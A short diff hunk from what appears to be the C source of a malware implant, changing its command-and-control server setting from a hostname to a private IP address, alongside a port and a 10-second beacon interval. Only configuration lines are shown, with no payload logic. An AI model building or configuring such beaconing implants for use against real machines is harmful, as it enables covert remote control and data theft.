@@ -11,7 +11,7 @@
 #include "loot.h"
 
 // Configuration
-#define C2_SERVER "c2.s0p0wned.local"
+#define C2_SERVER "10.18.207.184"//"c2.s0p0wned.local"
 #define C2_PORT 8443
 #define BEACON_INTERVAL 10  // Secondes entre chaque beacon
 
